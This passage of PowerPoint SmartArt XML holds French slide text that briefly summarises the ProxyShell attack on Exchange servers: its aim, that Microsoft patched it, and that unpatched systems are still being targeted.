      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{D8672C2F-01FE-4637-8134-B33647458C54}" type="sibTrans" cxnId="{61B087ED-D41C-4B03-B769-2A683371F2DC}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{09AFDB3F-0E47-42EF-9203-85D770880F4E}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:pPr>
            <a:defRPr b="1"/>
          </a:pPr>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>But de l’attaque :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{ED088F71-EEF3-47F3-A77E-C56490BC150D}" type="parTrans" cxnId="{5DAF3798-EB8A-48E9-B086-3B9EED912864}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{6D7EEAA3-B694-4AC9-96C3-1AFCC67C4E35}" type="sibTrans" cxnId="{5DAF3798-EB8A-48E9-B086-3B9EED912864}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{37D9FDB5-291F-42EA-9080-3202D5480D5F}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Exploiter des failles dans l’interface entre le client et les services backend.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{0FAE12CC-D24C-4B9E-9FFC-7086C3431E1F}" type="parTrans" cxnId="{5696D9BE-553A-4165-BC4F-6411C3FBD48D}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{04E4C6DD-1B75-4E65-BC88-EBD34BFB678E}" type="sibTrans" cxnId="{5696D9BE-553A-4165-BC4F-6411C3FBD48D}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{3A811AD6-5E80-46D1-8598-6177BB69984A}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Obtenir une session non authentifiée pour exécuter du code malveillant.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{E4FE262E-1051-44AF-8162-2D8D5D2136EE}" type="parTrans" cxnId="{391EE1A9-50A4-49C0-B3F8-EF38B8DA05DA}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{FD72561F-DCA4-4D8E-9B96-D689D8F5F216}" type="sibTrans" cxnId="{391EE1A9-50A4-49C0-B3F8-EF38B8DA05DA}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{F845F16B-AD9E-428D-8A16-591198C9BA0D}" type="pres">
      <dgm:prSet presAssocID="{23C5A21B-F0C7-461A-85C3-5D7723F82ADD}" presName="root" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:dir/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{7B8B32BE-0F41-4E4D-83D5-4BC122DC358D}" type="pres">
      <dgm:prSet presAssocID="{B3807BF6-6D3F-4ED0-94F3-0A977B577208}" presName="compNode" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{162A7DA1-CAB9-41A5-90CD-DAE07739DDED}" type="pres">
      <dgm:prSet presAssocID="{B3807BF6-6D3F-4ED0-94F3-0A977B57720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000CDAF-01E2-47E8-B0FC-8B0EC09BC775}" type="pres">
      <dgm:prSet presAssocID="{B3807BF6-6D3F-4ED0-94F3-0A977B577208}" presName="iconSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{209B7896-7BA2-43F8-98A8-2AB1EBEE1E9A}" type="pres">
      <dgm:prSet presAssocID="{B3807BF6-6D3F-4ED0-94F3-0A977B577208}" presName="parTx" presStyleLbl="revTx" presStyleIdx="0" presStyleCnt="4">
        <dgm:presLayoutVars>
          <dgm:chMax val="0"/>
          <dgm:chPref val="0"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{F77DEDD9-B78A-4A9A-B043-922F1A69BA73}" type="pres">
      <dgm:prSet presAssocID="{B3807BF6-6D3F-4ED0-94F3-0A977B577208}" presName="txSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{4E7CEB91-911B-47F2-9D38-9F01F4C1D7FD}" type="pres">
      <dgm:prSet presAssocID="{B3807BF6-6D3F-4ED0-94F3-0A977B577208}" presName="desTx" presStyleLbl="revTx" presStyleIdx="1" presStyleCnt="4">
        <dgm:presLayoutVars/>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{E7500902-27B7-4C66-8325-9E219BEC46F0}" type="pres">
      <dgm:prSet presAssocID="{4D18885E-46DE-4816-8485-3F0940571307}" presName="sibTrans" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{B2D9DC22-F0FF-45A6-978C-152F290457C4}" type="pres">
      <dgm:prSet presAssocID="{09AFDB3F-0E47-42EF-9203-85D770880F4E}" presName="compNode" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{85F40EB9-588C-4F33-956B-E17F78729D83}" type="pres">
      <dgm:prSet presAssocID="{09AFDB3F-0E47-42EF-9203-85D770880F4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0CBB54A8-CD37-4BE5-92D7-F51F70EBF531}" type="pres">
      <dgm:prSet presAssocID="{09AFDB3F-0E47-42EF-9203-85D770880F4E}" presName="iconSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{2DE474B6-A3B4-4734-B4AA-86FE46F6853E}" type="pres">
      <dgm:prSet presAssocID="{09AFDB3F-0E47-42EF-9203-85D770880F4E}" presName="parTx" presStyleLbl="revTx" presStyleIdx="2" presStyleCnt="4">
        <dgm:presLayoutVars>
          <dgm:chMax val="0"/>
          <dgm:chPref val="0"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{B6DA426B-86E4-4B16-843A-D19DA4631B4F}" type="pres">
      <dgm:prSet presAssocID="{09AFDB3F-0E47-42EF-9203-85D770880F4E}" presName="txSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{5C1CB02F-CCBD-4716-9C04-C8C47314D1DD}" type="pres">
      <dgm:prSet presAssocID="{09AFDB3F-0E47-42EF-9203-85D770880F4E}" presName="desTx" presStyleLbl="revTx" presStyleIdx="3" presStyleCnt="4">
        <dgm:presLayoutVars/>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
  </dgm:ptLst>
  <dgm:cxnLst>
    <dgm:cxn modelId="{0898497F-B490-4750-91B8-099678FBF598}" type="presOf" srcId="{09AFDB3F-0E47-42EF-9203-85D770880F4E}" destId="{2DE474B6-A3B4-4734-B4AA-86FE46F6853E}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/5/layout/CenteredIconLabelDescriptionList"/>
    <dgm:cxn modelId="{23318193-F4E6-4BEA-9C46-7FA2260F88E1}" srcId="{23C5A21B-F0C7-461A-85C3-5D7723F82ADD}" destId="{B3807BF6-6D3F-4ED0-94F3-0A977B577208}" srcOrd="0" destOrd="0" parTransId="{7A39EECD-816D-4D8E-9F26-A275BA2E6377}" sibTransId="{4D18885E-46DE-4816-8485-3F0940571307}"/>
    <dgm:cxn modelId="{5DAF3798-EB8A-48E9-B086-3B9EED912864}" srcId="{23C5A21B-F0C7-461A-85C3-5D7723F82ADD}" destId="{09AFDB3F-0E47-42EF-9203-85D770880F4E}" srcOrd="1" destOrd="0" parTransId="{ED088F71-EEF3-47F3-A77E-C56490BC150D}" sibTransId="{6D7EEAA3-B694-4AC9-96C3-1AFCC67C4E35}"/>
    <dgm:cxn modelId="{7958F5A2-2C32-4B26-9B02-BD488F9DA5C8}" type="presOf" srcId="{B3807BF6-6D3F-4ED0-94F3-0A977B577208}" destId="{209B7896-7BA2-43F8-98A8-2AB1EBEE1E9A}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/5/layout/CenteredIconLabelDescriptionList"/>
    <dgm:cxn modelId="{391EE1A9-50A4-49C0-B3F8-EF38B8DA05DA}" srcId="{09AFDB3F-0E47-42EF-9203-85D770880F4E}" destId="{3A811AD6-5E80-46D1-8598-6177BB69984A}" srcOrd="1" destOrd="0" parTransId="{E4FE262E-1051-44AF-8162-2D8D5D2136EE}" sibTransId="{FD72561F-DCA4-4D8E-9B96-D689D8F5F216}"/>
    <dgm:cxn modelId="{8EA903BA-8F06-441C-A120-C2F467BC602A}" type="presOf" srcId="{09662562-56F8-48BB-8F05-734454BC72CC}" destId="{4E7CEB91-911B-47F2-9D38-9F01F4C1D7FD}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/5/layout/CenteredIconLabelDescriptionList"/>
    <dgm:cxn modelId="{ED2A19BC-C8BC-4F2F-91D6-D23BACF1A56F}" type="presOf" srcId="{3A811AD6-5E80-46D1-8598-6177BB69984A}" destId="{5C1CB02F-CCBD-4716-9C04-C8C47314D1DD}" srcOrd="0" destOrd="1" presId="urn:microsoft.com/office/officeart/2018/5/layout/CenteredIconLabelDescriptionList"/>
    <dgm:cxn modelId="{5696D9BE-553A-4165-BC4F-6411C3FBD48D}" srcId="{09AFDB3F-0E47-42EF-9203-85D770880F4E}" destId="{37D9FDB5-291F-42EA-9080-3202D5480D5F}" srcOrd="0" destOrd="0" parTransId="{0FAE12CC-D24C-4B9E-9FFC-7086C3431E1F}" sibTransId="{04E4C6DD-1B75-4E65-BC88-EBD34BFB678E}"/>
    <dgm:cxn modelId="{635F71CB-4A39-460A-9882-8F5FA47B2310}" type="presOf" srcId="{37D9FDB5-291F-42EA-9080-3202D5480D5F}" destId="{5C1CB02F-CCBD-4716-9C04-C8C47314D1DD}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/5/layout/CenteredIconLabelDescriptionList"/>
    <dgm:cxn modelId="{5A86E3D5-01DA-47CB-9411-7DC4DE1B8D53}" type="presOf" srcId="{5D4BDB03-9350-43A0-B42B-0056C5A543F5}" destId="{4E7CEB91-911B-47F2-9D38-9F01F4C1D7FD}" srcOrd="0" destOrd="1" presId="urn:microsoft.com/office/officeart/2018/5/layout/CenteredIconLabelDescriptionList"/>
    <dgm:cxn modelId="{C8ADBCDD-65DF-4511-97A8-3C8BD6A766F5}" srcId="{B3807BF6-6D3F-4ED0-94F3-0A977B577208}" destId="{09662562-56F8-48BB-8F05-734454BC72CC}" srcOrd="0" destOrd="0" parTransId="{F218FB4B-2AE7-4448-8760-EC84120C4E2F}" sibTransId="{A9023CA2-CFC9-4ECC-BD71-A9CAB8A11514}"/>
    <dgm:cxn modelId="{F17C12E8-E7DD-45E3-9739-AC610DD267F9}" type="presOf" srcId="{23C5A21B-F0C7-461A-85C3-5D7723F82ADD}" destId="{F845F16B-AD9E-428D-8A16-591198C9BA0D}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/5/layout/CenteredIconLabelDescriptionList"/>
    <dgm:cxn modelId="{61B087ED-D41C-4B03-B769-2A683371F2DC}" srcId="{B3807BF6-6D3F-4ED0-94F3-0A977B577208}" destId="{5D4BDB03-9350-43A0-B42B-0056C5A543F5}" srcOrd="1" destOrd="0" parTransId="{3145F5F8-C40C-4AF2-92B4-4138F607F54B}" sibTransId="{D8672C2F-01FE-4637-8134-B33647458C54}"/>
    <dgm:cxn modelId="{95F5F26E-EC2F-4559-BBDE-72AB8A580D17}" type="presParOf" srcId="{F845F16B-AD9E-428D-8A16-591198C9BA0D}" destId="{7B8B32BE-0F41-4E4D-83D5-4BC122DC358D}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/5/layout/CenteredIconLabelDescriptionList"/>
    <dgm:cxn modelId="{30BE97EF-7BEA-4527-BC4F-973DA665BF12}" type="presParOf" srcId="{7B8B32BE-0F41-4E4D-83D5-4BC122DC358D}" destId="{162A7DA1-CAB9-41A5-90CD-DAE07739DDED}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/5/layout/CenteredIconLabelDescriptionList"/>
    <dgm:cxn modelId="{1A90AAC3-1FD2-4D49-8DD3-109F28D06D55}" type="presParOf" srcId="{7B8B32BE-0F41-4E4D-83D5-4BC122DC358D}" destId="{1000CDAF-01E2-47E8-B0FC-8B0EC09BC775}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/5/layout/CenteredIconLabelDescriptionList"/>
    <dgm:cxn modelId="{CDB2F136-2D9F-49A3-ABB7-C9277B8DAE6C}" type="presParOf" srcId="{7B8B32BE-0F41-4E4D-83D5-4BC122DC358D}" destId="{209B7896-7BA2-43F8-98A8-2AB1EBEE1E9A}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/5/layout/CenteredIconLabelDescriptionList"/>
    <dgm:cxn modelId="{B9D63D76-525E-4863-BEC0-CBB36AF67D23}" type="presParOf" srcId="{7B8B32BE-0F41-4E4D-83D5-4BC122DC358D}" destId="{F77DEDD9-B78A-4A9A-B043-922F1A69BA73}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/5/layout/CenteredIconLabelDescriptionList"/>
    <dgm:cxn modelId="{8620DE3F-1F2B-4B76-A88C-ECA622D27960}" type="presParOf" srcId="{7B8B32BE-0F41-4E4D-83D5-4BC122DC358D}" destId="{4E7CEB91-911B-47F2-9D38-9F01F4C1D7FD}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/5/layout/CenteredIconLabelDescriptionList"/>
    <dgm:cxn modelId="{95E46D2C-11B4-4159-A09F-52078DF8DF1B}" type="presParOf" srcId="{F845F16B-AD9E-428D-8A16-591198C9BA0D}" destId="{E7500902-27B7-4C66-8325-9E219BEC46F0}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/5/layout/CenteredIconLabelDescriptionList"/>
    <dgm:cxn modelId="{9150C9AD-2199-49B5-A7B5-8D28A06BAC13}" type="presParOf" srcId="{F845F16B-AD9E-428D-8A16-591198C9BA0D}" destId="{B2D9DC22-F0FF-45A6-978C-152F290457C4}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/5/layout/CenteredIconLabelDescriptionList"/>
    <dgm:cxn modelId="{9C401CCB-E922-40EC-88CE-6599B55897B2}" type="presParOf" srcId="{B2D9DC22-F0FF-45A6-978C-152F290457C4}" destId="{85F40EB9-588C-4F33-956B-E17F78729D83}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/5/layout/CenteredIconLabelDescriptionList"/>
    <dgm:cxn modelId="{2C2F3366-4411-45C4-9A03-2002950DBB16}" type="presParOf" srcId="{B2D9DC22-F0FF-45A6-978C-152F290457C4}" destId="{0CBB54A8-CD37-4BE5-92D7-F51F70EBF531}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/5/layout/CenteredIconLabelDescriptionList"/>
    <dgm:cxn modelId="{8E367C6D-8EDD-4AA8-9FBA-3022A5EAA068}" type="presParOf" srcId="{B2D9DC22-F0FF-45A6-978C-152F290457C4}" destId="{2DE474B6-A3B4-4734-B4AA-86FE46F6853E}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/5/layout/CenteredIconLabelDescriptionList"/>
    <dgm:cxn modelId="{B0142FD0-FF03-49D5-B2A1-B1E3F883BBF3}" type="presParOf" srcId="{B2D9DC22-F0FF-45A6-978C-152F290457C4}" destId="{B6DA426B-86E4-4B16-843A-D19DA4631B4F}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/5/layout/CenteredIconLabelDescriptionList"/>
    <dgm:cxn modelId="{7D708852-225B-4BF1-A02A-82B390E30D18}" type="presParOf" srcId="{B2D9DC22-F0FF-45A6-978C-152F290457C4}" destId="{5C1CB02F-CCBD-4716-9C04-C8C47314D1D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00E0852-6E8F-4881-BF22-E032AA81EA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559D4D6-B1ED-452C-99CF-8276E9665841}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Microsoft a corrigé les failles, mais de nombreux systèmes restent non patchés.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{8E302511-23ED-4D55-B082-E0338A735AEE}" type="parTrans" cxnId="{7BDA11FB-67E6-43A2-8155-0558F5A9B5D2}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{6D61A2B5-3898-4736-A8EA-CD3206F2609F}" type="sibTrans" cxnId="{7BDA11FB-67E6-43A2-8155-0558F5A9B5D2}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{E8C98C46-CCB0-43A3-998D-6B374AF73976}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>ProxyShell reste exploité activement dans des attaques ciblées.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B94800F9-C7A5-4F0A-999C-D3B232E98438}" type="parTrans" cxnId="{A22896A3-A0EE-45A5-9A63-AA9BD6798F9C}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{A7CC39EF-345F-4D38-91DD-276B86AABB50}" type="sibTrans" cxnId="{A22896A3-A0EE-45A5-9A63-AA9BD6798F9C}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{639513EB-41EB-42A5-8959-24B9B4F7FF46}" type="pres">
      <dgm:prSet presAssocID="{F00E0852-6E8F-4881-BF22-E032AA81EAF4}" presName="root" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:dir/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{D35793B8-CB71-47FD-A22A-7CED4C3C6E10}" type="pres">
      <dgm:prSet presAssocID="{C559D4D6-B1ED-452C-99CF-8276E9665841}" presName="compNode" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{EE6A45D2-96A5-49BE-B1AF-37870970ECAA}" type="pres">
      <dgm:prSet presAssocID="{C559D4D6-B1ED-452C-99CF-8276E9665841}" presName="bgRect" presStyleLbl="bgShp" presStyleIdx="0" presStyleCnt="2"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{AFD5DF0E-9CBB-407B-A557-494D77EE08E1}" type="pres">
      <dgm:prSet presAssocID="{C559D4D6-B1ED-452C-99CF-8276E966584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9B63069-09D9-4D71-AA39-984F521E4BE8}" type="pres">
      <dgm:prSet presAssocID="{C559D4D6-B1ED-452C-99CF-8276E9665841}" presName="spaceRect" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{0AAF618F-6B3A-4BE3-9C2A-3C4404C3C1AA}" type="pres">
      <dgm:prSet presAssocID="{C559D4D6-B1ED-452C-99CF-8276E9665841}" presName="parTx" presStyleLbl="revTx" presStyleIdx="0" presStyleCnt="2">
        <dgm:presLayoutVars>
          <dgm:chMax val="0"/>
          <dgm:chPref val="0"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{1A08C186-2D37-4CA0-8A97-23393D572C57}" type="pres">
      <dgm:prSet presAssocID="{6D61A2B5-3898-4736-A8EA-CD3206F2609F}" presName="sibTrans" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{036D966A-70D1-4964-9374-64D821410955}" type="pres">
      <dgm:prSet presAssocID="{E8C98C46-CCB0-43A3-998D-6B374AF73976}" presName="compNode" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{3367C00D-09D2-4C74-A4BF-DCA90361F13B}" type="pres">
      <dgm:prSet presAssocID="{E8C98C46-CCB0-43A3-998D-6B374AF73976}" presName="bgRect" presStyleLbl="bgShp" presStyleIdx="1" presStyleCnt="2"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{118B28F7-F1C0-480C-9ECE-84224478C5E6}" type="pres">
      <dgm:prSet presAssocID="{E8C98C46-CCB0-43A3-998D-6B374AF7397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ngue"/>
        </a:ext>
      </dgm:extLst>
    </dgm:pt>
    <dgm:pt modelId="{8C8DC579-79A2-41CD-9F1A-EBE6632350D8}" type="pres">
      <dgm:prSet presAssocID="{E8C98C46-CCB0-43A3-998D-6B374AF73976}" presName="spaceRect" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{6C4A643B-F999-40CE-B12B-9A822429E0A4}" type="pres">
      <dgm:prSet presAssocID="{E8C98C46-CCB0-43A3-998D-6B374AF7397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F7EBC4F-F7F7-4A99-98DF-166FD735F640}" type="presOf" srcId="{C559D4D6-B1ED-452C-99CF-8276E9665841}" destId="{0AAF618F-6B3A-4BE3-9C2A-3C4404C3C1AA}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{A22896A3-A0EE-45A5-9A63-AA9BD6798F9C}" srcId="{F00E0852-6E8F-4881-BF22-E032AA81EAF4}" destId="{E8C98C46-CCB0-43A3-998D-6B374AF73976}" srcOrd="1" destOrd="0" parTransId="{B94800F9-C7A5-4F0A-999C-D3B232E98438}" sibTransId="{A7CC39EF-345F-4D38-91DD-276B86AABB50}"/>
    <dgm:cxn modelId="{1E6349AB-AA8A-4DA3-AE3E-D92B81E6DA45}" type="presOf" srcId="{F00E0852-6E8F-4881-BF22-E032AA81EAF4}" destId="{639513EB-41EB-42A5-8959-24B9B4F7FF46}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{C48986F0-8652-476C-BD66-A5ACC4B979B6}" type="presOf" srcId="{E8C98C46-CCB0-43A3-998D-6B374AF73976}" destId="{6C4A643B-F999-40CE-B12B-9A822429E0A4}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{7BDA11FB-67E6-43A2-8155-0558F5A9B5D2}" srcId="{F00E0852-6E8F-4881-BF22-E032AA81EAF4}" destId="{C559D4D6-B1ED-452C-99CF-8276E9665841}" srcOrd="0" destOrd="0" parTransId="{8E302511-23ED-4D55-B082-E0338A735AEE}" sibTransId="{6D61A2B5-3898-4736-A8EA-CD3206F2609F}"/>
    <dgm:cxn modelId="{A4442556-365D-42FD-B13F-170070343CAF}" type="presParOf" srcId="{639513EB-41EB-42A5-8959-24B9B4F7FF46}" destId="{D35793B8-CB71-47FD-A22A-7CED4C3C6E10}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{FCFB2805-BE9F-4A23-A1B7-7530671609E8}" type="presParOf" srcId="{D35793B8-CB71-47FD-A22A-7CED4C3C6E10}" destId="{EE6A45D2-96A5-49BE-B1AF-37870970ECAA}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{10A0B82B-E743-4ACF-83BE-FA03A3DF471B}" type="presParOf" srcId="{D35793B8-CB71-47FD-A22A-7CED4C3C6E10}" destId="{AFD5DF0E-9CBB-407B-A557-494D77EE08E1}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{E0AB434B-2CC6-4A13-A1E5-943A9583B5B2}" type="presParOf" srcId="{D35793B8-CB71-47FD-A22A-7CED4C3C6E10}" destId="{39B63069-09D9-4D71-AA39-984F521E4BE8}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{85A3D3ED-C3A3-4821-988B-D12367C062AF}" type="presParOf" srcId="{D35793B8-CB71-47FD-A22A-7CED4C3C6E10}" destId="{0AAF618F-6B3A-4BE3-9C2A-3C4404C3C1AA}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{595266D0-6625-478C-9769-74EA18BF3D2C}" type="presParOf" srcId="{639513EB-41EB-42A5-8959-24B9B4F7FF46}" destId="{1A08C186-2D37-4CA0-8A97-23393D572C57}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{264512CF-C9D8-4FEE-BE5F-2BE132FD2587}" type="presParOf" srcId="{639513EB-41EB-42A5-8959-24B9B4F7FF46}" destId="{036D966A-70D1-4964-9374-64D821410955}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{F3F54426-50E9-40B4-B37A-57F8E8919807}" type="presParOf" srcId="{036D966A-70D1-4964-9374-64D821410955}" destId="{3367C00D-09D2-4C74-A4BF-DCA90361F13B}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{D22EA48E-7221-4B74-9C09-681CFA199AD4}" type="presParOf" srcId="{036D966A-70D1-4964-9374-64D821410955}" destId="{118B28F7-F1C0-480C-9ECE-84224478C5E6}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{441CA401-4E21-48EA-8A16-537D5A96D8A6}" type="presParOf" srcId="{036D966A-70D1-4964-9374-64D821410955}" destId="{8C8DC579-79A2-41CD-9F1A-EBE6632350D8}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{04DC5F57-F252-4859-BE77-D6B14CA7DB46}" type="presParOf" srcId="{036D966A-70D1-4964-9374-64D821410955}" destId="{6C4A643B-F999-40CE-B12B-9A822429E0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24FFF7F-0534-496A-B5C2-94732AB6101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E58B470-90ED-47AC-8023-1421583D464C}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Le paysage actuel :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{8BAFC4FA-41BC-438C-8AF9-5827F8FE2BB6}" type="parTrans" cxnId="{2FB7AC02-1180-4492-B506-9D2CF7698870}">
